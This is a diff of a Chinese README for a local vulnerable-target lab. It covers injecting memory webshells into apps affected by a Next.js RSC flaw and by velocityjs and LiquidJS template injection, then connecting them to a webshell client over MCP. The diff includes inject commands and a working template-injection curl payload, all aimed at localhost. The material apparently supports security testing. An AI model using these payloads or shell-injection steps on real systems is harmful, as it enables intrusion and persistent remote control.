@@ -20,7 +20,7 @@
 ```bash
 ./shlabs.sh list                      # 列出全部环境（自动发现 base/*/shlabs.yml）
 ./shlabs.sh up <env>                  # 构建镜像 + 启动（首次构建较慢）
-./shlabs.sh inject <env> --key mysecretkey [--verify]   # 注入（内置漏洞版本校验门）
+./shlabs.sh inject <env> --key mysecretkey            # 注入（内置漏洞版本校验门）
 ./shlabs.sh info <env>                # 环境详情
 ./shlabs.sh logs <env>                # 日志
 ./shlabs.sh down <env>                # 停止
@@ -39,19 +39,11 @@
 `inject.sh` 会先执行**漏洞版本校验门**（读取容器内依赖版本，不在漏洞区间即报错退出，
 防止上游漂移导致靶场静默失效），再调用 `injectors/` 下对应的注入器。
 
-**`--verify` 协议真形三态探测**（三个注入器同构）：发送 gzip 线格式的
-`methodName=test` 调用（与 ShallowEnd 客户端 Call 同构），**绝不携带处理器源码**——
-壳把首个触发头请求的 body 当 core 源码 eval 入 `_cacheHandler` 槽位，任何"源码预热"
-式探针都会毒化内存马（历史 PONG 探针正是此缺陷，已移除）：
-
-- `Verify OK — shell resident, core healthy (test -> ok)`：壳 + core 全健康；
-- `Shell intercepts next-action ...`：壳已接管、core 未投递——**全新注入目标的预期
-  状态，不算失败**（key 不匹配时也出此态）；app 实连投递 core 后复跑应转全健康；
-- `no shell takeover detected`：未检出壳接管（失败）。
-
-> 注：A 态信封判定按 json 响应解析——生成壳若配**二进制响应伪装**
-> （pngidat/pdfstream/gifdata），verify 无法解析其信封，core 健康时也只会落
-> B 态提示；这类 profile 的健康判定以 ShallowEnd `webshell_test` 为准。
+**注入器只做注入**（无 `--verify` 探针）：emit 壳把首个触发头请求的 body 当
+core 源码 eval 入 `_cacheHandler` 槽位，任何"源码预热"式探针都会毒化内存马且
+重注入无效（历史 PONG 探针即此缺陷）。注入成功标记（`SSTI_SHELL_OK:<pid>` /
+flight `exploit ok!`）仅证明代码执行；连通性与健康验证统一由 ShallowEnd 连接期
+（`webshell_test`：投递 core + `test` 调用断言）完成。
 
 **ShallowEnd 侧验收（可选）**：MCP `webshell_create`（group_id=本地测试分组，
 profile 匹配 rc4 + `mysecretkey`）→ `webshell_test` 实连。
@@ -106,13 +98,12 @@ profile 匹配 rc4 + `mysecretkey`）→ `webshell_test` 实连。
 curl http://127.0.0.1:21511/api/tags   # {"tags":[...]}  即 API 就绪
 curl http://127.0.0.1:21501/           # 200 即前端就绪
 
-./shlabs.sh inject CVE-2025-55182 --key mysecretkey --verify
+./shlabs.sh inject CVE-2025-55182 --key mysecretkey
 # 预期：版本门 OK（next@16.0.6 / react@19.2.0）→ exploit ok! → 连接信息输出
-#       → 全新目标：Shell intercepts next-action ...（壳已接管，core 待 app 实连投递；
-#         投递后复跑 --verify 输出 Verify OK — core healthy）
 
-# 最小 PoC（不依赖 ShallowEnd）：注入器 --verify 即协议真形探测；手工触发头
-# 请求见 injectors/cve-2025-55182_flight.py 的 verify()——同款协议对 21501 生效
+# ⚠️ flight 重注入需先重建容器（结构性限制）：exploit 请求自带 Next-Action 触发头
+# （RSC action 路由依赖），驻留壳会拦截该头的一切请求 → 对已注入目标 exploit
+# 恒得 200 空响应。先 `clean` / `down -v` 重建，再注入。
 ```
 
 体验应用：浏览器打开 `http://127.0.0.1:21501`（Conduit 博客，注册任意账号即可）。
@@ -136,10 +127,8 @@ curl -s http://127.0.0.1:21503/api/render \
   -d '{"template":"#set($f=$x.constructor.constructor(\"return 6*7\"))#set($r=$f())$r","data":{"x":{}}}'
 # 预期：{"result":"42"}
 
-./shlabs.sh inject CVE-2026-73649 --key mysecretkey --verify
+./shlabs.sh inject CVE-2026-73649 --key mysecretkey
 # 预期：版本门 OK（velocityjs@2.1.6）→ Inject OK — memory shell resident in PID N
-#       → 全新目标：Shell intercepts next-action ...（壳已接管，core 待 app 实连投递；
-#         投递后复跑 --verify 输出 Verify OK — shell resident, core healthy (test -> ok)）
 ```
 
 ## 3. base/CVE-2026-45618 — LiquidJS SSTI RCE（真实目标：dungeon-revealer）
@@ -160,10 +149,8 @@ context → `group_by`/`where`/`first|last` gadget 读取内部函数 → 覆写
 ./shlabs.sh up CVE-2026-45618
 curl -o /dev/null -w '%{http_code}' http://127.0.0.1:21504/   # 200 即就绪
 
-./shlabs.sh inject CVE-2026-45618 --key mysecretkey --verify
+./shlabs.sh inject CVE-2026-45618 --key mysecretkey
 # 预期：版本门 OK（liquidjs@10.25.7）→ Inject OK — memory shell resident in PID N
-#       → 全新目标：Shell intercepts next-action ...（壳已接管，core 待 app 实连投递；
-#         投递后复跑 --verify 输出 Verify OK — shell resident, core healthy (test -> ok)）
 ```
 
 最小 PoC（任意 JS 执行，不经 socket.io）：聊天渲染即 Liquid 渲染，本地可单独验证
@@ -179,7 +166,8 @@ curl -o /dev/null -w '%{http_code}' http://127.0.0.1:21504/   # 200 即就绪
 | 端口被占用 | `docker ps` 查残留容器（尤其改名前的旧项目名容器）；`docker rm -f <name>` |
 | RealWorld API 起不来（seed 段错误） | 必须用 Debian 系基础镜像（`Dockerfile.api` 已固定 node:20-slim）；seed 已顺序化（`patches/seed-sequential.patch`） |
 | dungeon-revealer 构建期 apt 404 | node:16 基于 bullseye（2026-08 已归档），Dockerfile 已固定切 archive.debian.org 且删除 bullseye-security 源 |
-| 注入成功但 `--verify` 失败 | verify 是协议真形三态探测（见 §0）：全新目标输出"壳已接管/core 未投递"提示属**预期**非失败，仅 `no shell takeover detected` 才是失败。内存马驻留在**进程**里；容器重启/`down` 后需重新注入。多进程容器（cluster 模式）注意注入的 PID 是否对外服务进程 |
+| 注入成功但 ShallowEnd 连不上 | 内存马驻留在**进程**里；容器重启/`down` 后需重新注入。多进程容器（cluster 模式）注意注入的 PID 是否对外服务进程 |
+| flight 重注入返回 200 空响应 | 结构性限制：exploit 请求自带 Next-Action 触发头，驻留壳拦截该头的一切请求——先 `clean` / `down -v` 重建容器再注入 |
 
 ## 4.1 Mem Pipe 交互终端 e2e（主仓）
 
@@ -203,5 +191,5 @@ Dockerfile 变化的镜像）。
 
 每个环境的最小验收 = `./shlabs.sh up <env>` 服务健康 + `./shlabs.sh inject <env>`
 返回注入成功标记（`SSTI_SHELL_OK:<pid>` / flight `exploit ok!`）。
-完整验收 = 注入器 `--verify` 三态判定（全新目标=接管提示；app 实连投递 core 后复跑=
-`core healthy`）+ ShallowEnd 客户端（MCP `webshell_test`）实连成功并可执行命令。
+完整验收 = ShallowEnd 客户端（MCP `webshell_test`）实连成功并可执行命令（连接期
+验证覆盖壳接管、core 投递与协议回环，是唯一权威口径）。
